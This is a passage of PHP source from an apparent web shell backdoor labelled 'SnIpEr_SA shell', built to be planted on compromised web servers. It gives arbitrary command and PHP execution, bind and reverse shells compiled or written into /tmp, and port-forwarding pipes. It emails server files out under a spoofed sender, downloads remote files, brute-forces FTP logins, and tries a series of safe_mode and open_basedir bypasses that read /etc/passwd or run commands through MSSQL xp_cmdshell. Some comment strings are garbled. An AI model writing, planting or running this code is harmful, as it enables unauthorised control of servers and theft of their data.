echo ws(3).@getenv("USERNAME")."&lt;br&gt;";
echo ws(3).$dir;
echo "&lt;br&gt;";
echo ws(3)."&lt;b&gt;Your ip: &lt;a href=http://".$_SERVER["REMOTE_ADDR"]."&gt;".$_SERVER["REMOTE_ADDR"]."&lt;/a&gt; - Server ip: &lt;a href=http://".gethostbyname($_SERVER["HTTP_HOST"])."&gt;".gethostbyname($_SERVER["HTTP_HOST"])."&lt;/a&gt;&lt;/b&gt;&lt;br/&gt;";
echo "&lt;br&gt;&lt;/font&gt;";
}
echo "&lt;/font&gt;";
echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$_POST['from']."\r\n");
 err(6+$res);
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {
 if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    $filename = @basename($_POST['loc_file']);
    $filedump = @fread($file,@filesize($_POST['loc_file']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=&gt;$filename,
                    "type"=&gt;$mime_type,
                    "content"=&gt;$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from SnIpEr_SA shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    err(6+$res);
    $_POST['cmd']="";
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;".$lang[$language.'_text61']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;".$lang[$language.'_text63']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;".$lang[$language.'_text62']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
       }
      else { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;".$lang[$language.'_text64']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { err(1,$_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "&lt;form name=save_file method=post&gt;";
 echo ws(3)."&lt;b&gt;".$_POST['e_name']."&lt;/b&gt;";
 echo "&lt;div align=center&gt;&lt;textarea name=e_text cols=121 rows=24&gt;";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "&lt;/textarea&gt;";
 echo "&lt;input type=hidden name=e_name value=".$_POST['e_name']."&gt;";
 echo "&lt;input type=hidden name=dir value=".$dir."&gt;";
 echo "&lt;input type=hidden name=cmd value=save_file&gt;";
 echo (!empty($only_read)?("&lt;br&gt;&lt;br&gt;".$lang[$language.'_text44']):("&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \"&gt;"));
 echo "&lt;/div&gt;";
 echo "&lt;/font&gt;";
 echo "&lt;/form&gt;";
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
 if(!$file=@fopen($_POST['e_name'],"w")) { err(0,$_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($file,$_POST['e_text']);
 @touch($_POST['e_name'],$mtime,$mtime);
 $_POST['cmd']="";
 echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;".$lang[$language.'_text45']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 }
 }

if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
$_POST['cmd']="echo \"Now try connect to nc -vv ".gethostbyname($_SERVER["HTTP_HOST"])." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['port1']))
{
 cf("bds",$port_bind_bd_cs);
 $blah = ex("chmod 777 bds");
 $blah = ex("./bds ".$_POST['port1']." &");
 $_POST['cmd']="echo \"Now script install backdoor connect to port ";
  }else{
cf("/tmp/bds",$port_bind_bd_cs);
 $blah = ex("chmod 777 bds");
 $blah = ex("./tmp/bds ".$_POST['port1']." &");
 }
if (!empty($_POST['php_ini1']))
{
 cf("php.ini",$php_ini1);
  $_POST['cmd']=" ?????? ????? ??? php.ini ?? ??? ???";
 }
 if (!empty($_POST['htacces']))
{
 cf(".htaccess",$htacces);
  $_POST['cmd']="?????? ????? ??????? htaccess ?? ??? ???";
 }
  if (!empty($_POST['file_ini']))
{
 cf("ini.php",$sni_res);
  $_POST['cmd']=" http://target.com/ini.php?ss=http://shell.txt? ??????? ss ???????? ini.php ???? ?? ???? ?????? ????";
 }
if(($_POST['fileto'] != "")||($_POST['filefrom'] != ""))
{
$data = implode("", file($_POST['filefrom']));
$fp = fopen($_POST['fileto'], "wb");
fputs($fp, $data);
$ok = fclose($fp);
if($ok)
{
$size = filesize($_POST['fileto'])/1024;
$sizef = sprintf("%.2f", $size);
print "&lt;center&gt;&lt;div id=logostrip&gt;Download - OK.
(".$sizef."ê?)&lt;/div&gt;&lt;/center&gt;";
}
else
{
print "&lt;center&gt;&lt;div id=logostrip&gt;Something is wrong. Download - IS NOT
OK&lt;/div&gt;&lt;/center&gt;";
}
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
 $_POST['cmd']="echo \"Now try connect to nc -vv ".gethostbyname($_SERVER["HTTP_HOST"])." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...Datached\"";
}
if (!empty($_POST['ips']) && !empty($_POST['ports']))
{
 cf("/tmp/backs",$back_connects);
 $p2=which("perl");
 $blah = ex($p2." /tmp/backs ".$_POST['ips']." ".$_POST['ports']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ips']." port ".$_POST['ports']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(!empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("&lt;font color=red face=Fixedsys&gt;&lt;div align=center&gt;Error uploading file ".$HTTP_POST_FILES['userfile']['name']."&lt;/div&gt;&lt;/font&gt;");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
 break;
 case GET:
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); }
 else
  {
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }
  else
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);        }
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);        }
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); $_POST['cmd'] = ""; }
 else if(!$users=get_users()) { echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;font color=red face=tahoma size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$lang[$language.'_text96']."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"; $_POST['cmd'] = ""; }
 @ftp_close($connection);
 }
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": &lt;b&gt;".$_POST['cmd']."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;div align=center&gt;&lt;textarea name=report cols=121 rows=15&gt;";


if ($method=="file") {
                        if (@file($file)) {
                                $filer = file($file);
                                foreach ($filer as $a) { echo $a; }
                        } else {
                                echo "&lt;script&gt; alert(\"unable to read file: $file using: file\"); &lt;/script&gt;";
                        }
                }
                if ($method=="fread") {
                        if (@fopen($file, 'r')) {
                                $fp = fopen($file, 'r');
                                $string = fread($fp, filesize($file));
                                echo "&lt;pre&gt;";
                                echo $string;
                                echo "&lt;/pre&gt;";
                        } else {
                                echo "&lt;script&gt; alert(\"unable to read file: $file using: fread\"); &lt;/script&gt;";
                        }
                }
                if ($method=="show_source") {
                        if (show_source($file)) {
                                echo "&lt;pre&gt;";
                                echo show_source($file);
                                echo "&lt;/pre&gt;";
                        } else {
                                echo "&lt;script&gt; alert(\"unable to read file: $file using: show_source\"); &lt;/script&gt;";
                        }
                }
                if ($method=="readfile") {
                        echo "&lt;pre&gt;";
                        if (readfile($file)) {
                                //echo "&lt;pre&gt;";
                                //echo readfile($file);
                                echo "&lt;/pre&gt;";
                        } else {
                                echo "&lt;/pre&gt;";
                                echo "&lt;script&gt; alert(\"unable to read file: $file using: readfile\"); &lt;/script&gt;";
                        }
                }
function dozip1($link,$file)
{
   $fp = @fopen($link,"r");
   while(!feof($fp))
   {
       $cont.= fread($fp,1024);
   }
   fclose($fp);
   $fp2 = @fopen($file,"w");
   fwrite($fp2,$cont);
   fclose($fp2);
}
if (isset($_POST['funzip']))
{
dozip1($_POST['funzip'],$_POST['fzip']);
}
if(empty($_POST['root'])){
} else {
   $root = $_POST['root']; }


  $c = 0; $D = array();
  set_error_handler("eh");
  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  for($i=0; $i &lt; strlen($chars); $i++){
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";
  $prevD = $D[count($D)-1];
  glob($path."*");
        if($D[count($D)-1] != $prevD){
        for($j=0; $j &lt; strlen($chars); $j++){
           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";
           $prevD2 = $D[count($D)-1];
           glob($path."*");
              if($D[count($D)-1] != $prevD2){

                 for($p=0; $p &lt; strlen($chars); $p++){
                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";
                 $prevD3 = $D[count($D)-1];
                 glob($path."*");
                    if($D[count($D)-1] != $prevD3){

                       for($r=0; $r &lt; strlen($chars); $r++){
                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                       glob($path."*");
                       }
                    }
                 }
              }
        }
        }
  }
  $D = array_unique($D);


  foreach($D as $item)
  if(isset($_REQUEST['root']))
  echo "{$item}\n";


  function eh($errno, $errstr, $errfile, $errline){
     global $D, $c, $i;
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
     if($o){ $D[$c] = $o[2]; $c++;}
  }


if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d-&gt;read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  &lt;DIR&gt; "; else printf("% 7s ",$size);
     }
     else{
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d-&gt;close();
   }
  else echo $lang[$language._text29];
 break;
    }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}
 if($_POST['cmd'])
{
 switch($_POST['cmd'])
 {
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'mysqlb':
$mhost = "localhost";
$muser = $_POST['test3_ml'];
$mpass = $_POST['test3_mp'];
$mdb   = $_POST['test3_md'];
$file = $_POST['test3_file'];
// default mysql_read files [seperated by: ':']:
$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);

                                                                $sql = array (
                                                                   "USE $mdb",
                                                                   'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
                                                                   "LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
                                                                   . "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
                                                                   . "ESCAPED BY          '' "
                                                                   . "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
                                                                   "SELECT a FROM $tbl LIMIT 1"
                                                                );

                                                                mysql_connect ($mhost, $muser, $mpass);
                                                                foreach ($sql as $statement) {
                                                                   $q = mysql_query ($statement);
                                                                   if ($q == false) die (
                                                                      "FAILED: " . $statement . "\n" .
                                                                      "REASON: " . mysql_error () . "\n"
                                                                   );
                                                                   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
                                                                   echo htmlspecialchars($r[0]);
                                                                   mysql_free_result ($q);
                                                                }

echo "&lt;/textarea&gt;";
 break;
  case 'test4':
  if(empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table SnIpEr_SA_temp_table",$db);
     @mssql_query("create table SnIpEr_SA_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into SnIpEr_SA_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from SnIpEr_SA_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }
    @mssql_query("drop table SnIpEr_SA_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');
  $extra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $lines = file ('/tmp/mb_send_mail');
  foreach ($lines as $line) { echo htmlspecialchars($line)."\r\n"; }
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i &lt; count($dir_list); $i++) echo $dir_list[$i]."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo $str;
  @imap_close($stream);
  break;
  case 'test8':
  if(@copy("compress.zlib://".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];
  else echo $lang[$language.'_text119'];
  break;
case 'cURL':
   if(empty($_POST['SnIpEr_SA'])){

} else {
$curl=$_POST['SnIpEr_SA'];
$ch =curl_init("file:///".$curl."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "&lt;/textarea&gt;&lt;/CENTER&gt;";
}
break;
case 'copy':
if(empty($snn)){
if(empty($_GET['snn'])){
if(empty($_POST['snn'])){
} else {
$u1p=$_POST['snn'];
}
} else {
$u1p=$_GET['snn'];
}
}
  $u1p=""; // File to Include... or use _GET _POST
$tymczas=""; // Set $tymczas to dir where you have 777 like /var/tmp

$temp=tempnam($tymczas, "cx");
if(copy("compress.zlib://".$snn, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "&lt;/textarea&gt;&lt;/CENTER&gt;";
}
break;
case 'ini_restore':
 if(empty($_POST['ini_restore'])){
} else {
$ini=$_POST['ini_restore'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
require_once("$ini");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["ss"]);
echo "&lt;/textarea&gt;&lt;/CENTER&gt;";
}
break;
case 'glob':
function reg_glob()
{
$chemin=$_REQUEST['glob'];
$files = glob("$chemin*");

foreach ($files as $filename) {
   echo "$filename\n";
}
}
if(isset($_REQUEST['glob']))
{
reg_glob();
}
break;
case 'zend':
 if(empty($_POST['zend'])){
} else {
$dezend=$_POST['zend'];
include($_POST['zend']);
print_r($GLOBALS);
require_once("$dezend");
echo "&lt;/textarea&gt;&lt;/p&gt;";
}
break;
  case 'sym1':
     if(empty($_POST['sym1p'])){
             } else {
$symp=$_POST['sym1p'];
         }
     if(empty($_POST['sym1p2'])){
} else {
$symp2=$_POST['sym1p2'];
  symlink("a/a/a/a/a/a/", "dummy");
symlink("dummy".$symp2."".$symp."", "xxx");
unlink("dummy");
while (1) {
symlink(".", "dummy");
  }
 }
  break;
  case 'sym2':
  @include(xxx);
  break;
  case 'plugin':
  if ($_POST['plugin'] ){

                                           for($uid=0;$uid&lt;60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "&lt;/textarea&gt;";
             }
        break;
        case 'command':
          if (!empty($_POST['command'])) {
                if ($method=="system") {
                system($_POST['command']);
                echo "Functions system";
                }
                if ($method=="passthru") {
                passthru($_POST['command']);
                echo "Functions passthru";
                }
                if ($method=="exec") {
                        $string = exec($_POST['command']);
                        echo $string;
                        echo "Functions exec";
                }
                if ($method=="shell_exec") {
                $string = shell_exec($_POST['command']);
                echo $string;
                echo "Functions shell_exec";
                }
                if ($method=="popen") {
                $pp = popen($_POST['command'], 'r');
                $read = fread($pp, 2096);
                echo $read;
                pclose($pp);
                echo "Functions popen";
                  }
   if ($method=="proc_open") {

$command  = isset($_POST['command'])  ? $_POST['command']  : '';

/* Load the configuration. */
/* Default settings --- these settings should always be set to something. */
/* Merge settings. */
session_start();

    if (!empty($command)) {
        /* Save the command for late use in the JavaScript.  If the command is
         * already in the history, then the old entry is removed before the
         * new entry is put into the list at the front. */
        if (($i = array_search($_POST['command'], $_SESSION['history'])) !== false)
            unset($_SESSION['history'][$i]);
        array_unshift($_SESSION['history'], $_POST['command']);
        /* Now append the commmand to the output. */
        $_SESSION['output'] .= '$ ' . $_POST['command'] . "\n";
        /* Initialize the current working directory. */
        if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_POST['command'])) {
            $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
        } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_POST['command'], $regs)) {
            /* The current command is a 'cd' command which we have to handle
             * as an internal shell command. */
            if ($regs[1]{0} == '/') {
                /* Absolute path, we use it unchanged. */
                $new_dir = $regs[1];
            } else {
                /* Relative path, we append it to the current working
                 * directory. */
                $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
            }
            /* Transform '/./' into '/' */
            while (strpos($new_dir, '/./') !== false)
                $new_dir = str_replace('/./', '/', $new_dir);
            /* Transform '//' into '/' */
            while (strpos($new_dir, '//') !== false)
                $new_dir = str_replace('//', '/', $new_dir);
            /* Transform 'x/..' into '' */
            while (preg_match('|/\.\.(?!\.)|', $new_dir))
                $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
            if ($new_dir == '') $new_dir = '/';
            /* Try to change directory. */
            if (@chdir($new_dir)) {
                $_SESSION['cwd'] = $new_dir;
            } else {
                $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
            }
        } elseif (trim($_POST['command']) == 'exit') {
            logout();
        } else {
            /* The command is not an internal command, so we execute it after
             * changing the directory and save the output. */
            chdir($_SESSION['cwd']);
            // We canot use putenv() in safe mode.
            if (!ini_get('safe_mode')) {
                // Advice programs (ls for example) of the terminal size.
                putenv('ROWS=' . $rows);
                putenv('COLUMNS=' . $columns);
            }
            /* Alias expansion. */
            $length = strcspn($_POST['command'], " \t");
            $token = substr($_POST['command'], 0, $length);
            if (isset($ini['aliases'][$token]))
                $command = $ini['aliases'][$token] . substr($_POST['command'], $length);
            $io = array();
            $p = proc_open($_POST['command'],
                           array(1 =&gt; array('pipe', 'w'),
                                 2 =&gt; array('pipe', 'w')),
                           $io);
            /* Read output sent to stdout. */
            while (!feof($io[1])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                        ENT_COMPAT, 'UTF-8');
            }
            /* Read output sent to stderr. */
            while (!feof($io[2])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                        ENT_COMPAT, 'UTF-8');
            }
            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
        }
    }
    /* Build the command history for use in the JavaScript */
    if (empty($_SESSION['history'])) {
        $js_command_hist = '""';
    } else {
        $escaped = array_map('addslashes', $_SESSION['history']);
        $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
    }
               }
               }

  break;
   }
}


if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 foreach($users as $user)
  {
  $connection = @ftp_connect($ftp_server,$ftp_port,10);
  if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } }
  @ftp_close($connection);
  }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse'])) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("&lt;?","",$_POST['php_eval']);
 $eval = @str_replace("?&gt;","",$eval);
 @eval($eval);}
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  $sql = new my_sql();
  $sql-&gt;db   = $_POST['db'];
  $sql-&gt;host = $_POST['db_server'];
  $sql-&gt;port = $_POST['db_port'];
  $sql-&gt;user = $_POST['mysql_l'];
  $sql-&gt;pass = $_POST['mysql_p'];
  $sql-&gt;base = $_POST['mysql_db'];
  if(!$sql-&gt;connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
